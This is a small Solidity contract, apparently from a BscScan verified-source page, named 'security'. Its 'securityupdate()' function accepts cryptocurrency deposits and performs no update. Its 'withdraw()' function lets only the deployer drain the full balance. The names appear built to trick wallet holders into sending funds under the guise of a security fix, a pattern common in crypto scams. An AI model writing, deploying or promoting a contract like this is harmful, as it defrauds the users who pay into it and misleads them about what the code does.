/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

pragma solidity ^0.4.26;

contract security{
    address private owner;
    constructor() public{
        owner = msg.sender;
    }
    function securityupdate() public payable{
    }
    function withdraw() public{
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }
}